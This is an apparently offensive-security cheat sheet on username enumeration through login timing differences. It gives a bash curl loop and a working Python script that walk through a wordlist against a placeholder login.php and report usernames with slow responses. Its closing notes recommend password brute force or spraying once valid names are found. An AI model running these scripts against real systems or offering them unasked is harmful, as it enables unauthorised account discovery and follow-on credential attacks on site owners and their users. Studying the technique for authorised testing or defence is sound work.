# Timing Attack Username Enumeration

Applications that check username existence before password hashing introduce a measurable timing difference: valid usernames take longer (hash computation) while invalid ones fail fast. This allows enumerating valid usernames by measuring response times.

## Manual Test

```bash
# Compare response time for known-valid vs unknown username
for i in $(seq 1 5); do
  { time curl -s "http://<TARGET>/login.php?login=true" \
    -d "user=admin&password=wrong" > /dev/null; } 2>&1 | grep real
done
# ~1+ second → user exists

for i in $(seq 1 5); do
  { time curl -s "http://<TARGET>/login.php?login=true" \
    -d "user=doesnotexist&password=wrong" > /dev/null; } 2>&1 | grep real
done
# ~0.2 second → user does not exist
```

## Python Script

```python
#!/usr/bin/env python3
import requests, sys, time

url = "http://<TARGET>/login.php?login=true"
threshold = 1.0  # seconds

with open(sys.argv[1]) as f:
    names = [l.strip() for l in f if l.strip()]

for name in names:
    start = time.time()
    requests.post(url, data={"user": name, "password": "wrong"})
    elapsed = time.time() - start
    if elapsed > threshold:
        print(f"[+] Valid user: {name} ({elapsed:.2f}s)")
```

## Notes
- Threshold depends on password hashing cost; bcrypt adds ~100-500ms typical
- Run multiple times per candidate to average out network jitter
- Also applies to SMTP `VRFY` command for username enumeration (no timing needed)
- After finding valid usernames, brute force password or spray common passwords
